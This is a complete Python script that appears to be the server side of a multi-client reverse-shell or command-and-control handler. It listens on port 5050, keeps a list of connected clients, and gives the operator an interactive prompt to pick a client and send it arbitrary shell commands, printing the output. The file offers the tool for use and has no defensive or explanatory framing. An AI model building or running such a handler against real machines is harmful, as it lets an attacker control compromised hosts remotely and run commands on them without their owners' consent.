import socket
import threading

clients = {}
client_id_counter = 1
lock = threading.Lock()

def accept_connections(server_socket):
    global client_id_counter
    while True:
        client_socket, addr = server_socket.accept()
        with lock:
            clients[client_id_counter] = (client_socket, addr)
            print(f"[+] Client {client_id_counter} connected from {addr[0]}:{addr[1]}")
            client_id_counter += 1

def list_clients():
    print("\n=== Connected Clients ===")
    for cid, (_, addr) in clients.items():
        print(f"[ID {cid}] {addr[0]}:{addr[1]}")
    print("=========================\n")

def send_command_to_client(client_id, command):
    client_socket = clients[client_id][0]
    try:
        client_socket.send(command.encode())
        response = client_socket.recv(8192).decode(errors="ignore")
        print(f"\n--- Output from Client {client_id} ---\n{response}\n----------------------------")
    except Exception as e:
        print(f"[-] Error communicating with client {client_id}: {e}")

def start_server(host='0.0.0.0', port=5050):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(20)
    print(f"[+] Server listening on {host}:{port}")

    threading.Thread(target=accept_connections, args=(server_socket,), daemon=True).start()

    while True:
        cmd = input("SERVER >> ").strip()
        if cmd == "list":
            list_clients()
        elif cmd.startswith("select"):
            try:
                _, cid = cmd.split()
                cid = int(cid)
                if cid not in clients:
                    print("[-] Invalid client ID.")
                    continue
                print(f"[+] Entering command mode with Client {cid}. Type 'back' to return.")
                while True:
                    subcmd = input(f"Client {cid} $ ").strip()
                    if subcmd.lower() == "back":
                        break
                    send_command_to_client(cid, subcmd)
            except:
                print("[-] Usage: select <client_id>")
        elif cmd == "exit":
            print("[*] Exiting. Closing all connections...")
            for sock, _ in clients.values():
                try:
                    sock.send(b"exit")
                    sock.close()
                except:
                    pass
            break
        else:
            print("[-] Unknown command. Use: list, select <id>, exit")

if __name__ == "__main__":
    start_server()
